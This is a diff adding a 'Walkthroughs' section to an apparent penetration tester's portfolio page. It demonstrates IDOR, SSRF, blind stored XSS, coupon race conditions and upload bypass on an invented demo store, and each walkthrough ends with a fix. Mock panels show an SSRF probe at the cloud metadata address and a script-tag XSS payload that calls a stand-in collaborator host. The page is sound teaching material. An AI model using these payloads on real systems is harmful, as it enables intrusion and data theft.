@@ -372,6 +372,65 @@ footer{
 }
 .note[open]>summary .note__name{color:var(--accent)}
 
+/* ─── walkthroughs ───────────────────────────────────────── */
+.walks{display:flex;flex-direction:column;gap:.9rem}
+.walk{border:1px solid var(--line);border-radius:7px;background:var(--surface);overflow:hidden;transition:border-color .2s}
+.walk[open]{border-color:var(--accent-dim)}
+.walk>summary{
+  list-style:none;cursor:pointer;
+  display:grid;grid-template-columns:auto 1fr auto;gap:.4rem 1rem;align-items:center;
+  padding:1.1rem 1.3rem;
+}
+.walk>summary::-webkit-details-marker{display:none}
+.walk__tag{font:600 .66rem/1.4 var(--mono);letter-spacing:.09em;text-transform:uppercase;color:#0A0D13;background:var(--accent);padding:.25rem .5rem;border-radius:3px;white-space:nowrap}
+.walk__name{font-size:1.1rem;font-weight:600;letter-spacing:-.01em;line-height:1.3}
+.walk>summary:hover .walk__name{color:var(--accent)}
+.walk__plus{position:relative;width:13px;height:13px;flex:none;color:var(--faint);transition:transform .25s,color .2s}
+.walk>summary:hover .walk__plus{color:var(--accent)}
+.walk__plus::before,.walk__plus::after{content:"";position:absolute;background:currentColor}
+.walk__plus::before{left:0;top:6px;width:13px;height:1.5px}
+.walk__plus::after{left:6px;top:0;width:1.5px;height:13px}
+.walk[open] .walk__plus{transform:rotate(45deg)}
+.walk__body{padding:0 1.3rem 1.6rem;border-top:1px solid var(--line-soft)}
+.walk__scene{font-family:var(--serif);color:var(--dim);font-size:1rem;line-height:1.62;margin:1.3rem 0 1.7rem;padding-left:1rem;border-left:2px solid var(--accent-dim)}
+.walk__scene b{color:var(--text);font-weight:600}
+
+.steps2{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:1.7rem;counter-reset:st}
+.step2{display:grid;grid-template-columns:1.9rem 1fr;gap:.4rem 1rem;align-items:start}
+.step2::before{
+  counter-increment:st;content:counter(st);
+  font:600 .82rem/1 var(--mono);color:var(--accent);
+  border:1px solid var(--accent-dim);border-radius:50%;
+  width:1.9rem;height:1.9rem;display:grid;place-items:center;
+}
+.step2__c{grid-column:2;min-width:0}
+.step2 h4{margin:.3rem 0 .5rem;font-size:1rem;font-weight:600;letter-spacing:-.01em}
+.step2 p{margin:0;color:var(--dim);font-size:.94rem;line-height:1.62}
+.step2 p code,.walk__scene code{font:.85em/1 var(--mono);background:var(--surface-2);color:var(--text);padding:.14em .38em;border-radius:3px;border:1px solid var(--line)}
+
+/* mock browser / request panels — all synthetic */
+.mock{border:1px solid var(--line);border-radius:6px;overflow:hidden;background:var(--ink);margin:.85rem 0 0}
+.mock__bar{display:flex;align-items:center;gap:.4rem;padding:.5rem .65rem;background:var(--surface-2);border-bottom:1px solid var(--line)}
+.mock__dot{width:9px;height:9px;border-radius:50%;background:var(--line);flex:none}
+.mock__url{margin-left:.35rem;font:.71rem/1 var(--mono);color:var(--dim);background:var(--ink);border:1px solid var(--line);border-radius:999px;padding:.4rem .75rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
+.mock__url b{color:var(--accent);font-weight:500}
+.mock__view{padding:1rem 1.05rem}
+.mock__code{margin:0;padding:.9rem 1.05rem;overflow-x:auto;font:.77rem/1.7 var(--mono);color:var(--dim);white-space:pre}
+.mock__code mark{background:var(--accent-wash);color:var(--accent);font-weight:500;padding:.05em .25em;border-radius:2px}
+.mock__code .c{color:var(--faint)}
+.mock__code .g{color:#7fb888}
+.mock__cap{padding:.5rem .8rem;font:.65rem/1.4 var(--mono);color:var(--faint);background:var(--surface);border-top:1px solid var(--line-soft);letter-spacing:.03em}
+.mock__cap::before{content:"▚ ";color:var(--accent-dim)}
+
+.ui{display:flex;flex-direction:column;gap:.45rem}
+.ui-row{display:flex;justify-content:space-between;gap:1rem;padding:.5rem .7rem;background:var(--surface);border:1px solid var(--line-soft);border-radius:4px}
+.ui-row span{color:var(--faint);font:.68rem/1.5 var(--mono);text-transform:uppercase;letter-spacing:.05em}
+.ui-row b{color:var(--text);font-weight:500;font-size:.86rem}
+.ui-row.hit{border-color:var(--accent-dim);background:var(--accent-wash)}
+.ui-row.hit b{color:var(--accent)}
+.walk__fix{margin:1.6rem 0 0;padding:.85rem 1rem;background:var(--surface-2);border:1px solid var(--line-soft);border-radius:5px;font:.86rem/1.6 var(--mono);color:var(--dim)}
+.walk__fix b{color:var(--accent);font-weight:500}
+
 /* ─── reveal ─────────────────────────────────────────────── */
 .rv{opacity:0;transform:translateY(14px);transition:opacity .6s cubic-bezier(.2,.6,.2,1),transform .6s cubic-bezier(.2,.6,.2,1)}
 .rv.in{opacity:1;transform:none}
@@ -404,6 +463,7 @@ footer{
       <a href="#experience">Experience</a>
       <a href="#engagements">Engagements</a>
       <a href="#fieldnotes">Field notes</a>
+      <a href="#walkthroughs">Walkthroughs</a>
       <a href="#capabilities">Capabilities</a>
       <a href="#credentials">Credentials</a>
       <a href="#contact">Contact</a>
@@ -719,6 +779,258 @@ footer{
 
         </div>
         <p class="prose rv" style="margin-top:1.75rem;font-size:.9rem;color:var(--faint)">Educational summaries for defenders and learners. They describe classes of flaw in the abstract and intentionally omit any working exploit, payload, or affected system.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="sec" id="walkthroughs">
+    <div class="wrap sec__grid">
+      <div class="sec__label rv"><h2>Walkthroughs</h2><p>Step-by-step,<br>illustrated on a<br>synthetic app</p></div>
+      <div>
+        <p class="prose rv" style="margin-bottom:1.5rem">Detailed reproduction flow for a handful of the classes above, illustrated on <b style="color:var(--text)">a demo application I built for teaching — <code>demo.shopline.test</code></b>. Every screen, URL, name, and value shown is invented for illustration.</p>
+        <p class="prose rv" style="margin:0 0 2rem;font-size:.9rem;color:var(--faint)">No client, no real system, no engagement data appears here. The mockups are hand-drawn UI, not screenshots — nothing to blur, because nothing is real.</p>
+
+        <div class="walks rv">
+
+          <details class="walk" open>
+            <summary><span class="walk__tag">Access</span><span class="walk__name">IDOR — reading another user's order</span><span class="walk__plus" aria-hidden="true"></span></summary>
+            <div class="walk__body">
+              <p class="walk__scene">On the demo store, each customer can open their own order receipt. The receipt is fetched by a numeric <code>id</code> in the URL — and the server never checks that the order belongs to the logged-in user. <b>That missing ownership check is the whole bug.</b></p>
+              <ol class="steps2">
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Open your own order and note the pattern</h4>
+                  <p>Logged in as <code>ava@example.test</code>, you view your receipt. The identifier sits in plain sight in the address bar — sequential, guessable.</p>
+                  <figure class="mock">
+                    <div class="mock__bar"><span class="mock__dot"></span><span class="mock__dot"></span><span class="mock__dot"></span><span class="mock__url">demo.shopline.test/account/orders?id=<b>1042</b></span></div>
+                    <div class="mock__view"><div class="ui">
+                      <div class="ui-row"><span>Order</span><b>#SL-1042</b></div>
+                      <div class="ui-row"><span>Account</span><b>Ava Reed (you)</b></div>
+                      <div class="ui-row"><span>Total</span><b>$74.00</b></div>
+                    </div></div>
+                    <figcaption class="mock__cap">Illustrative mockup — synthetic app, not a real target</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Decrement the identifier</h4>
+                  <p>Change <code>id=1042</code> to <code>id=1041</code> and re-send. If the server enforced ownership it would answer <code>403 Forbidden</code>. Here it returns <code>200</code> with someone else's receipt.</p>
+                  <figure class="mock">
+                    <pre class="mock__code"><span class="c"># request (edited in an intercepting proxy)</span>
+GET /account/orders?id=<mark>1041</mark> HTTP/1.1
+Host: demo.shopline.test
+Cookie: session=&lt;ava's own session&gt;
+
+<span class="c"># response</span>
+<span class="g">HTTP/1.1 200 OK</span>
+{ "order":"SL-1041", "name":"<mark>Marcus Cole</mark>",
+  "email":"<mark>m.cole@example.test</mark>", "total":"$248.00" }</pre>
+                    <figcaption class="mock__cap">Synthetic request/response — invented data</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Confirm it is another account, then measure the range</h4>
+                  <p>The returned name and email are not yours — that confirms the finding. Walking the <code>id</code> up and down maps how many records are reachable. For the report you would stop at proof and record the impact, never harvest live data.</p>
+                  <figure class="mock">
+                    <div class="mock__view"><div class="ui">
+                      <div class="ui-row hit"><span>Order</span><b>#SL-1041 — not your account</b></div>
+                      <div class="ui-row hit"><span>Name</span><b>Marcus Cole</b></div>
+                      <div class="ui-row hit"><span>Email</span><b>m.cole@example.test</b></div>
+                    </div></div>
+                    <figcaption class="mock__cap">Illustrative — the "someone else's data" result</figcaption>
+                  </figure>
+                </div></li>
+
+              </ol>
+              <p class="walk__fix"><b>Fix</b> —enforce object ownership server-side — the record's owner must equal the authenticated user before it is returned.</p>
+            </div>
+          </details>
+
+          <details class="walk">
+            <summary><span class="walk__tag">Injection</span><span class="walk__name">SSRF — reaching an internal endpoint</span><span class="walk__plus" aria-hidden="true"></span></summary>
+            <div class="walk__body">
+              <p class="walk__scene">The demo store lets a merchant register a <b>webhook URL</b> for order events. The server fetches that URL — so if it doesn't restrict the destination, it can be steered at systems only the server can reach.</p>
+              <ol class="steps2">
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Find the feature that fetches a URL for you</h4>
+                  <p>Merchant settings accept a callback address. The browser never loads it — the <em>server</em> does, from inside the network.</p>
+                  <figure class="mock">
+                    <div class="mock__bar"><span class="mock__dot"></span><span class="mock__dot"></span><span class="mock__dot"></span><span class="mock__url">demo.shopline.test/settings/webhooks</span></div>
+                    <div class="mock__view"><div class="ui">
+                      <div class="ui-row"><span>Webhook URL</span><b>https://my-shop.example/hooks</b></div>
+                      <div class="ui-row"><span>Trigger</span><b>order.created</b></div>
+                    </div></div>
+                    <figcaption class="mock__cap">Illustrative mockup — synthetic app</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Point it at a listener you control</h4>
+                  <p>Set the URL to an out-of-band collaborator host and trigger the event. A callback <em>from the server's IP</em> proves the server makes the request — the precondition for SSRF.</p>
+                  <figure class="mock">
+                    <pre class="mock__code">POST /settings/webhooks HTTP/1.1
+Host: demo.shopline.test
+
+url=<mark>https://oob.collab.example/probe</mark>
+
+<span class="c"># collaborator log</span>
+DNS + HTTP hit from <mark>203.0.113.10</mark>  (server egress, not your IP)</pre>
+                    <figcaption class="mock__cap">Synthetic — RFC 5737 example address</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Probe internal-only destinations</h4>
+                  <p>Now aim at addresses the server can reach but you cannot — cloud metadata or loopback services. A useful response where the internet would time out demonstrates internal reach. Scope and rules of engagement bound how far this goes.</p>
+                  <figure class="mock">
+                    <pre class="mock__code">url=<mark>http://169.254.169.254/latest/meta-data/</mark>
+<span class="c"># response body relayed back through the webhook preview</span>
+<span class="g">200</span> iam/  hostname  instance-id ...</pre>
+                    <figcaption class="mock__cap">Illustrative link-local address — no real metadata shown</figcaption>
+                  </figure>
+                </div></li>
+
+              </ol>
+              <p class="walk__fix"><b>Fix</b> —allow-list destinations, resolve-then-validate against internal ranges, and block redirects to private addresses.</p>
+            </div>
+          </details>
+
+          <details class="walk">
+            <summary><span class="walk__tag">Injection</span><span class="walk__name">Blind stored XSS — firing in an admin panel</span><span class="walk__plus" aria-hidden="true"></span></summary>
+            <div class="walk__body">
+              <p class="walk__scene">A shopper can set a display name. Staff later see that name in a back-office console. If the name is stored raw and rendered without encoding, <b>the shopper's markup runs in the staff member's browser</b> — somewhere the shopper can't see.</p>
+              <ol class="steps2">
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Plant a tagged, call-home payload</h4>
+                  <p>In the display-name field, submit a script that loads a uniquely-tagged resource from a collaborator, so a hit tells you exactly which sink rendered it.</p>
+                  <figure class="mock">
+                    <pre class="mock__code">Display name:
+<mark>"&gt;&lt;script src=//oob.collab.example/x?id=name-field&gt;&lt;/script&gt;</mark></pre>
+                    <figcaption class="mock__cap">Synthetic payload against the demo app only</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Wait for it to render somewhere you can't reach</h4>
+                  <p>You never load the admin console — but when staff open the customer list, the stored name executes in <em>their</em> session and the tagged resource is requested.</p>
+                  <figure class="mock">
+                    <div class="mock__bar"><span class="mock__dot"></span><span class="mock__dot"></span><span class="mock__dot"></span><span class="mock__url">demo.shopline.test/admin/customers <span style="color:var(--faint)">(staff view)</span></span></div>
+                    <div class="mock__view"><div class="ui">
+                      <div class="ui-row hit"><span>Customer</span><b>&lt;payload executes here&gt;</b></div>
+                      <div class="ui-row"><span>Since</span><b>Aug 2026</b></div>
+                    </div></div>
+                    <figcaption class="mock__cap">Illustrative — the back-office sink you cannot see directly</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Confirm from the callback</h4>
+                  <p>The collaborator logs the tagged hit — proof the payload stored and executed in a privileged context. A real report stops at that proof of execution; it does not pivot into staff accounts.</p>
+                  <figure class="mock">
+                    <pre class="mock__code"><span class="c"># collaborator log</span>
+GET /x?id=<mark>name-field</mark>  referer: <mark>/admin/customers</mark>
+<span class="g">→ stored XSS confirmed, fires in staff context</span></pre>
+                    <figcaption class="mock__cap">Synthetic callback log</figcaption>
+                  </figure>
+                </div></li>
+
+              </ol>
+              <p class="walk__fix"><b>Fix</b> —context-aware output encoding at every sink, plus a strict Content-Security-Policy as defence in depth.</p>
+            </div>
+          </details>
+
+          <details class="walk">
+            <summary><span class="walk__tag">Logic</span><span class="walk__name">Race condition — redeeming a one-time coupon twice</span><span class="walk__plus" aria-hidden="true"></span></summary>
+            <div class="walk__body">
+              <p class="walk__scene">A coupon is meant to work <b>once</b>. The code checks "is it unused?" and then marks it used — but those are two separate steps. Fire many redemptions in the same instant and several pass the check before any of them flips the flag.</p>
+              <ol class="steps2">
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Establish the single-use rule</h4>
+                  <p>Redeem the coupon once, normally. A second attempt is rejected — the intended behaviour.</p>
+                  <figure class="mock">
+                    <pre class="mock__code">POST /cart/coupon   code=<mark>WELCOME10</mark>   <span class="g">→ 200 applied</span>
+POST /cart/coupon   code=WELCOME10   <span class="c">→ 400 already used</span></pre>
+                    <figcaption class="mock__cap">Synthetic sequential requests</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Send many redemptions simultaneously</h4>
+                  <p>With a fresh coupon, dispatch a tight parallel burst (single-packet timing) so they all arrive during the same check-then-update window.</p>
+                  <figure class="mock">
+                    <pre class="mock__code"><span class="c"># 20 requests released together</span>
+POST /cart/coupon  code=<mark>SAVE20</mark>   ×20  (parallel)</pre>
+                    <figcaption class="mock__cap">Illustrative timing burst</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Observe the limit breached</h4>
+                  <p>Instead of one success, several apply — the discount stacks well past "once", proving the check and the update were not atomic.</p>
+                  <figure class="mock">
+                    <div class="mock__view"><div class="ui">
+                      <div class="ui-row"><span>Expected</span><b>1 × discount</b></div>
+                      <div class="ui-row hit"><span>Actual</span><b>6 × discount applied</b></div>
+                    </div></div>
+                    <figcaption class="mock__cap">Illustrative result on the demo cart</figcaption>
+                  </figure>
+                </div></li>
+
+              </ol>
+              <p class="walk__fix"><b>Fix</b> —make check-and-consume atomic — a single conditional update, a row lock, or a unique constraint on redemption.</p>
+            </div>
+          </details>
+
+          <details class="walk">
+            <summary><span class="walk__tag">Upload</span><span class="walk__name">Unrestricted upload — content-type trust bypass</span><span class="walk__plus" aria-hidden="true"></span></summary>
+            <div class="walk__body">
+              <p class="walk__scene">The avatar upload says "images only", but it decides by trusting the browser-supplied <code>Content-Type</code> and the file extension — both of which the client fully controls. <b>Trusting client-declared type is the flaw.</b></p>
+              <ol class="steps2">
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Baseline a normal upload</h4>
+                  <p>A real PNG uploads fine and is served back from a predictable path.</p>
+                  <figure class="mock">
+                    <pre class="mock__code">POST /account/avatar   filename="me.png"   Content-Type: image/png
+<span class="g">→ 200</span>  served at /uploads/av/me.png</pre>
+                    <figcaption class="mock__cap">Synthetic upload flow</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Send a non-image but declare it an image</h4>
+                  <p>Upload a different file type while keeping <code>Content-Type: image/png</code> and an image-looking name. If validation only reads those, it accepts the file.</p>
+                  <figure class="mock">
+                    <pre class="mock__code">POST /account/avatar
+filename="<mark>note.png</mark>"   Content-Type: <mark>image/png</mark>
+<span class="c"># body is not actually image data</span>
+<span class="g">→ 200 accepted</span></pre>
+                    <figcaption class="mock__cap">Illustrative — no real payload shown</figcaption>
+                  </figure>
+                </div></li>
+
+                <li class="step2"><div class="step2__c">
+                  <h4>Confirm where it lands and how it's served</h4>
+                  <p>Retrieve the stored file and check the response — is it served inside the web root, with what type and headers? That determines the real impact, which you then document for the fix.</p>
+                  <figure class="mock">
+                    <div class="mock__view"><div class="ui">
+                      <div class="ui-row hit"><span>Validation</span><b>Passed on declared type only</b></div>
+                      <div class="ui-row"><span>Impact</span><b>Depends on serve path &amp; handling</b></div>
+                    </div></div>
+                    <figcaption class="mock__cap">Illustrative outcome summary</figcaption>
+                  </figure>
+                </div></li>
+
+              </ol>
+              <p class="walk__fix"><b>Fix</b> —validate real content (magic bytes), re-encode images, store outside the web root, and serve with a fixed safe type.</p>
+            </div>
+          </details>
+
+        </div>
       </div>
     </div>
   </section>
